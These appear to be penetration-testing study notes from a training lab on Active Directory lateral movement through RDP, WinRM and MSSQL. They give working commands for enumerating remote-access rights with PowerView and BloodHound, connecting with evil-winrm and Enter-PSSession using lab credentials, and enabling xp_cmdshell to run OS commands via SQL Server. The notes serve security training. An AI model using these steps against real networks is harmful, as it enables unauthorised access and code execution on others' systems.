if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.

But what if we don't yet have local admin rights on any hosts in the domain?

- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
* [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM) access
* `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database.


---
## Remote Desktop

Using PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host.

Let's check out the `Remote Desktop Users` group on the `MS01` host in our target domain.

#### Enumerating the Remote Desktop Users Group

	PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

Typically the first thing I check after importing BloodHound data is:

**Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?**
#### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound

![[bh_RDP_domain_users.png]]

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

#### Checking Remote Access Rights using BloodHound

![[execution_rights.png]]


---
## WinRM

Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts.

This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access.

#### Enumerating the Remote Management Users Group

	PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access.

##### Custom Query : 

	MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

#### Establishing WinRM Session from Windows

We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.

	PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force 
	PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) 
	PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

From our Linux attack host, we can use the tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect.

To use `evil-winrm` we can install it using the following command:

#### Installing Evil-WinRM

	AstraX01@htb[/htb]$ gem install evil-winrm

#### Connecting to a Target with Evil-WinRM and Valid Credentials

	AstraX01@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend


---
## SQL Server Admin

we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance.

Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.

##### Using Bloodhound Custom Queries 

	MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

#### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound

![[sqladmins_bh.png]]

First, let's hunt for SQL server instances.

#### Enumerating MSSQL Instances with PowerUpSQL

	PS C:\htb> cd .\PowerUpSQL\ 
	PS C:\htb> Import-Module .\PowerUpSQL.ps1 
	PS C:\htb> Get-SQLInstanceDomain

We could then authenticate against the remote SQL server host and run custom queries or operating system commands.

	PS C:\htb> Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.

#### Running mssqlclient.py Against the Target

	AstraX01@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

#### Viewing our Options with Access to the SQL Server

	SQL> help

We could then choose `enable_xp_cmdshell` to enable the [xp_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

#### Choosing enable_xp_cmdshell

	SQL> enable_xp_cmdshell

#### Enumerating our Rights on the System using xp_cmdshell

	xp_cmdshell whoami /priv

